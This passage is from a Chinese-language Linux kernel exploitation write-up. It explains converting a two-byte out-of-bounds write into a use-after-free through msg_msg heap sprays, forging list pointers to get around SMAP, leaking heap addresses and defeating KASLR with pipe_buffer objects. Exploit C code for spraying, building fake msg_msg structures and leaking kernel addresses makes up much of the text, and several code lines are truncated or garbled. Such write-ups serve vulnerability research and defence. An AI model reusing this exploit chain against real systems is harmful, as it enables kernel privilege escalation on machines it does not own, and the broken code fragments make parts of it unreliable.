* * *
## 3\. 漏洞利用
`msg_msg`结构的创建与读取，也即消息的发送与接收，可以参考文章
[Linux内核中利用msg_msg结构实现任意地址读写](https://www.anquanke.com/post/id/252558)
中对`msgsnd()`和`msgrcv()`源码的分析过程。
**3-1 漏洞转化：2字节溢出写0转化为UAF**
**（1）调用`msgget()`创建4096个消息队列**
消息队列数目没有限制，但创建越多，exp越稳定
      for (int i = 0; i m_list->next`末尾两字节覆盖为0,
使得该主消息的`msg_msg->m_list->next`指向其他主消息的辅助消息。
**目的** ：使某个内存被两个主消息引用。
      printf("[*] Triggering out-of-bounds write...\n");
      if (trigger_oob_write(s) m_list->next`成员被修改。为保证查看消息时，避免消息被释放，需使用`MSG_COPY`标志接收消息。
      printf("[*] Searching for corrupted primary message...\n");
      for (int i = 0; i m_list->next`指向同一辅助消息。
  * 1.主消息1放弃辅助消息msg_msg, skb占据msg_msg
  * 2.主消息2放弃辅助消息msg_msg, victim结构占据msg_msg
  * 3.此时skb与victim结构占据同一内存空间
  * 4.修改skb劫持victim结构内函数指针
  * 5.触发victim结构函数指针，劫持控制流
但是注意到当实现步骤2时，必须伪造`msg_msg->m_list->next`成员，如果此时主消息2释放msg_msg，辅助消息会被从循环链表`msg_msg->m_list`中去除，也就是说此阶段会涉及到对于`msg_msg->m_list->next`的读写，因为开启了smap保护机制，所以在用户态伪造该字段无意义，内核在此处会检查到smap错误，利用失败，所以接下来需要绕过SMAP。
**3-2 避免崩溃：伪造`msg_msg->m_list->next & prev`指针**
**（1）释放被重复引用的辅助消息**
      printf("[*] Freeing real secondary message...\n");
      if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
                   MTYPE_SECONDARY) m_list_next = m_list_next;
      msg->m_list_prev = m_list_prev;
      msg->m_type = MTYPE_FAKE;
      msg->m_ts = m_ts;
      msg->next = next;
      msg->security = 0;
    }
    int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
      for (int i = 0; i 主消息的堆地址（0x1000堆块地址）**
由于`m_ts`变大，可以越界读取相邻辅助消息的消息头，主要是泄露`msg_msg->m_list->next`和`msg_msg->m_list->prev`（相邻辅助消息的主消息堆地址，记为`kheap_addr`）。
      // Use the fake secondary message to read out-of-bounds.
      printf("[*] Leaking adjacent secondary message...\n");
      if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) m_list_next;
      if (kheap_addr & (PRIMARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;
      printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
**（4）泄露fake辅助消息的堆地址（0x400堆块地址）**
释放skb，重新填充该fake辅助消息， **`msg_msg->next =
kheap_addr`**，因此，某个主消息成了该辅助消息的segment（`msg_msgseg`结构）。这样就能越界读取主消息的头，主消息的`msg_msg->m_list->next`指向与之对应的辅助消息，也即fake辅助消息相邻的辅助消息，该内存地址-0x400，即为fake辅助消息的真实地址。
再次释放skb，将fake辅助消息的`msg_msg->m_list->next`填充为该fake辅助消息的真实地址，即可再次释放fake辅助消息时避免SMAP崩溃。
      printf("[*] Freeing fake secondary messages...\n");
      free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
      // Put kheap_addr at next to leak its content. Assumes zero bytes before
      // kheap_addr.
      printf("[*] Spraying fake secondary messages...\n");
      memset(secondary_buf, 0, sizeof(secondary_buf));
      build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                    sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      // fist 8 bytes must be NULL
      if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) m_list_next;
      if (kheap_addr & (SECONDARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;
      // Calculate the address of the fake secondary message.
      kheap_addr -= SECONDARY_SIZE;
      printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);
**3-3 绕过KASLR**
**目标** ：泄露内核基址。
**方法** ：伪造fake辅助消息，`msg_msg->m_list->next == msg_msg->m_list->pre ==
fake辅助消息`；利用主消息2释放辅助消息，使用`pipefd`函数分配`pipe_buffer`结构体重新占据fake辅助消息堆块；通过读skb泄露`anon_pipe_buf_ops`地址，绕过KASLR。`pipe_buffer`结构体中ops成员指向全局变量`anon_pipe_buf_ops`。
为什么不用[tty_struct](https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283)
来泄露？
      printf("[*] Freeing fake secondary messages...\n");
      free_skbuff(ss, secondary_buf, sizeof(secondary_buf));
      // Put kheap_addr at m_list_next & m_list_prev so that list_del() is possible.
      printf("[*] Spraying fake secondary messages...\n");
      memset(secondary_buf, 0, sizeof(secondary_buf));
      build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
      if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
        goto err_rmid;
      printf("[*] Freeing sk_buff data buffer...\n");
      if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
        goto err_rmid;
      printf("[*] Spraying pipe_buffer objects...\n");
      for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
          perror("[-] pipe");
          goto err_rmid;
        }
        // Write something to populate pipe_buffer.
        if (write(pipefd[i][1], "pwn", 3) < 0) {
          perror("[-] write");
          goto err_rmid;
        }